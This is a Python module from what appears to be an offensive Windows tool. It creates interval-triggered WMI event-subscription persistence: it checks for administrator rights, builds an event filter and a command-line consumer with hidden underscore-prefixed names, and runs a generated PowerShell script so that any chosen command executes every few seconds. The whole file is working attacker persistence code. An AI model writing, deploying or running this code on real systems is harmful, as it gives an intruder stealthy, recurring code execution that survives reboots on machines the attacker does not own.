"""
Interval-based WMI persistence triggers
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_powershell, check_admin
from templates.powershell import generate_creation_script
from config import WQL_QUERIES, TRIGGER_INTERVALS, WMI_NAMESPACES

def create_interval_persistence(event_name, command, interval=60):
    """
    Create WMI persistence that triggers at regular intervals
    
    Args:
        event_name (str): Event name prefix
        command (str): Command to execute
        interval (int): Trigger interval in seconds
        
    Returns:
        dict: Creation result
    """
    print(f"[*] Creating interval-based WMI persistence...")
    print(f"[*] Interval: {interval} seconds")
    
    if not check_admin():
        print("[!] Administrator privileges required")
        return {
            'success': False,
            'error': 'Administrator privileges required'
        }
    
    # Generate names
    filter_name = f"_{event_name}_Filter"
    consumer_name = f"_{event_name}_Consumer"
    
    # Generate WQL query
    wql_query = WQL_QUERIES['interval'].format(interval=interval)
    
    # Generate PowerShell script
    ps_script = generate_creation_script(
        filter_name=filter_name,
        consumer_name=consumer_name,
        wql_query=wql_query,
        command=command
    )
    
    # Execute script
    result = run_powershell(ps_script)
    
    if result['success']:
        print(f"[+] WMI persistence created successfully")
        print(f"[+] Event Name: {event_name}")
        print(f"[+] Filter: {filter_name}")
        print(f"[+] Consumer: {consumer_name}")
        print(f"[+] Trigger: Every {interval} seconds")
        
        return {
            'success': True,
            'event_name': event_name,
            'filter_name': filter_name,
            'consumer_name': consumer_name,
            'trigger_type': 'interval',
            'interval': interval,
            'command': command,
            'wql_query': wql_query
        }
    else:
        error = result.get('stderr', result.get('error', 'Unknown error'))
        print(f"[-] Failed to create WMI persistence: {error}")
        return {
            'success': False,
            'error': error
        }